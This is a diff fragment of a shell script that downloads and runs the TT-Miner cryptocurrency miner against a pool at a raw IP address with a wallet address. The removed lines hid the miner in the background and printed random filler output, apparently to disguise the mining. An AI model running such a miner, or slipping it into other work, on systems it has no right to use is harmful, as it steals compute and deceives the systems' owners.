@@ -3,5 +3,4 @@ wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2
 tar xvf TT-Miner-2024.3.2.tar.gz
 cd TT-Miner-2024.3.2
 chmod +x TT-Miner
-./TT-Miner -a ProgPowZ -o stratum+tcp://206.189.171.244:443 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95hU3Y7pUQ2uN2cJBSV > /dev/null 2>&1 & 
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
+./TT-Miner -a ProgPowZ -o stratum+tcp://206.189.171.244:443 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95hU3Y7pUQ2uN2cJBSV 
